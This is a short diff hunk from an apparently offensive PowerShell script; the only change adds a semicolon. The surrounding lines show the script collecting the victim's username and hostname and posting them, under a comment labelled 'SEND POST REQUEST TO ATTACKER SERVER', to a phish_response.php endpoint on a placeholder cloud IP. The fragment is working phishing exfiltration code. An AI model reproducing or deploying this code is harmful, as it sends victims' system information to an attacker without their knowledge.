@@ -58,7 +58,7 @@ $sysinfo = $username_output+$username_command+$newline+$hostname_output+$hostnam
 # SEND POST REQUEST TO ATTACKER SERVER
 
 $Body = @{
-    sysinfo_post = $sysinfo
+    sysinfo_post = $sysinfo;
 }
 
 Invoke-WebRequest 'http://<google cloud ip>/phish_response.php' -Body $Body -Method 'POST'
